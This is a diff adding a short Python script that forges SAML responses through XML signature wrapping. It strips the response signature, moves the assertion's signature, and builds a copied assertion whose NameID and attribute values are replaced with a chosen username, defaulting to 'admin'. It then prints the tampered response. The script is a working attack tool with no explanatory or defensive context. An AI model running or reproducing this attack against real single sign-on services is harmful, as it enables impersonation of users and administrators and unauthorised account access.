@@ -1,0 +1,46 @@
+import os
+import base64
+import urllib.parse
+from lxml import etree
+
+# Get environment variables
+username = b'admin@example.com'
+saml_response = os.getenv('SAMLResponse')
+username = os.getenv('username')
+if not username:
+    username='admin'
+# Decode and parse the SAML response
+xml_content = base64.b64decode(urllib.parse.unquote(saml_response))
+parser = etree.XMLParser(remove_blank_text=True)
+root = etree.fromstring(xml_content, parser)
+
+# Define namespaces
+namespaces = {
+    'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol',
+    'saml': 'urn:oasis:names:tc:SAML:2.0:assertion',
+    'ds': 'http://www.w3.org/2000/09/xmldsig#'
+}
+
+# Find the <ds:Signature> element inside the root
+response_signature = root.find('.//ds:Signature', namespaces)
+if response_signature is not None:
+    root.remove(response_signature)  # Remove the <ds:Signature> element from the root
+
+# Find the <saml:Assertion> element (this is the old assertion)
+old_ass = root.find('.//saml:Assertion', namespaces)
+ass_signode = old_ass.find('./ds:Signature',namespaces)
+if ass_signode is not None:
+    old_ass.remove(ass_signode)
+issuer = root.find('.//saml:Issuer', namespaces)
+issuer.addnext(ass_signode)
+mod_ass = etree.fromstring(etree.tostring(old_ass))
+mod_ass.find('.//saml:NameID',namespaces).text = username
+for s in mod_ass.findall('.//saml:AttributeValue',namespaces):
+        s.text = username
+mod_ass.attrib['ID'] = mod_ass.attrib['ID'][:-1]
+resp_issuer = root.find('.//samlp:Status', namespaces)
+resp_issuer.addnext(mod_ass)
+
+
+modified_saml_response = etree.tostring(root, pretty_print=False, encoding='UTF-8', xml_declaration=False).decode('utf-8')
+print(modified_saml_response)
